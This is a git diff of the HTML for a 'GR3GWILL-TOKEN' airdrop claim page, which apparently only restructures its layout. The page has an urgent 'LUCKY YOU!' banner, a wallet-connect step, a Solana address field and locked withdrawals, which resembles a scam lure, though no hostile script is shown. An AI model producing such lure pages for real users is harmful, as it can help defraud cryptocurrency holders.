@@ -9,29 +9,24 @@
 </head>
 <body>
 
-<div class="airdrop-wrap">
+<!-- Landing Section -->
+<div class="container" id="landingSection">
+  <div class="logo-circle">GR3G</div>
+  <h1 class="pulse">LUCKY YOU!</h1>
+  <p class="subtitle">GR3GWILL‑TOKEN airdrop is ongoing.</p>
+  <button id="proceedBtn">Click to Claim Airdrop</button>
+</div>
 
-  <!-- Landing / Proceed Section -->
-  <div class="container" id="landingSection">
-    <div class="logo-circle">GR3G</div>
-    <h1 class="pulse">LUCKY YOU!</h1>
-    <p class="subtitle">GR3GWILL‑TOKEN airdrop is still ongoing.</p>
+<!-- Connect Wallet Section -->
+<div class="container hidden" id="connectSection">
+  <button id="connectBtn">Connect Wallet</button>
+</div>
 
-    <button id="proceedBtn">Click to Claim Airdrop</button>
-  </div>
-
-  <!-- Connect Wallet Section -->
-  <div class="container hidden" id="connectSection">
-    <button id="connectBtn">Connect Wallet</button>
-  </div>
-
-  <!-- Solana Wallet Input Section -->
-  <div class="container hidden" id="solanaSection">
-    <input type="text" id="solAddress" placeholder="Enter your Solana wallet" />
-    <div class="progress"><span></span></div>
-    <button id="submitSol" class="hidden">Submit</button>
-  </div>
-
+<!-- Solana Wallet Input Section -->
+<div class="container hidden" id="solanaSection">
+  <input type="text" id="solAddress" placeholder="Enter your Solana wallet" />
+  <div class="progress"><span></span></div>
+  <button id="submitSol" class="hidden">Submit</button>
 </div>
 
 <!-- Terms Modal -->
@@ -55,23 +50,20 @@
         <p id="userWallet">—</p>
       </div>
     </div>
-
     <div class="balance-section">
       <span class="label">Airdrop Balance</span>
       <div class="balance" id="airdropBalance">0</div>
       <span class="token">GR3T</span>
     </div>
-
     <div class="balance-diff-section hidden" id="balanceDiffSection">
       <span class="label">Balance Change:</span>
       <div class="balance" id="balanceDiff">0</div>
       <span class="token">GR3T</span>
     </div>
-
     <p class="note">🔒 Withdrawals locked. Airdrop will be sent immediately after token launch.</p>
   </div>
 </section>
 
 <script src="script.js"></script>
 </body>
-  </html>
+                                     </html>
